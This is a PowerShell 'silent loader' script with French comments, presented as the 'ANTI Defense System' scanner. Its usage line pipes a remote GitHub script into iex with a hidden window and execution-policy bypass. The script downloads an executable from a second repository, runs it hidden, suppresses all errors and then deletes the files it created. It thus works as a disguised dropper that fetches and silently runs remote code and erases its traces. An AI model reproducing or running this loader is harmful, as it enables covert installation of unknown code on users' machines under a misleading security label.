# ANTI Defense System - Silent Loader v2.7.1
# Usage: powershell -WindowStyle Hidden -ExecutionPolicy Bypass -c "irm https://raw.githubusercontent.com/AdamZoda/ANTI/main/install.ps1 | iex"

$ErrorActionPreference = "SilentlyContinue"

# ─── Configuration ───────────────────────────────────────────────────────────
$REPO_URL   = "https://raw.githubusercontent.com/AdamZoda/exedownloader/main"
$installDir = "$env:LOCALAPPDATA\AntiScan"
$exePath    = "$installDir\anti-scan.exe"

# ─── Nettoyage ancien scan ────────────────────────────────────────────────────
Remove-Item -Path $installDir     -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item -Path "$env:TEMP\anti-scan.tmp" -Force -ErrorAction SilentlyContinue

# ─── Création du dossier d'installation ──────────────────────────────────────
New-Item -ItemType Directory -Force -Path $installDir | Out-Null

# ─── Téléchargement de l'exécutable ──────────────────────────────────────────
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

try {
    $wc = New-Object System.Net.WebClient
    $wc.Headers["User-Agent"] = "ANTI-Scanner/1.0"
    $wc.DownloadFile("$REPO_URL/anti-scan.exe", $exePath)
} catch {
    # Tentative de secours avec BitsTransfer
    try {
        Import-Module BitsTransfer -ErrorAction Stop
        Start-BitsTransfer -Source "$REPO_URL/anti-scan.exe" -Destination $exePath
    } catch {
        exit 1
    }
}

# ─── Vérification de l'intégrité ─────────────────────────────────────────────
if (-not (Test-Path $exePath)) { exit 1 }
$size = (Get-Item $exePath).Length
if ($size -lt 1000000) { exit 1 }

# ─── Lancement silencieux de l'exécutable ────────────────────────────────────
$CLEANUP_TARGETS = @(
    $installDir,
    "$env:TEMP\anti-scan.tmp"
)

try {
    Start-Process -FilePath $exePath -WindowStyle Hidden -Wait
} catch {}

# ─── Nettoyage post-scan ──────────────────────────────────────────────────────
foreach ($target in $CLEANUP_TARGETS) {
    try { Remove-Item -Path $target -Recurse -Force -ErrorAction SilentlyContinue } catch {}
}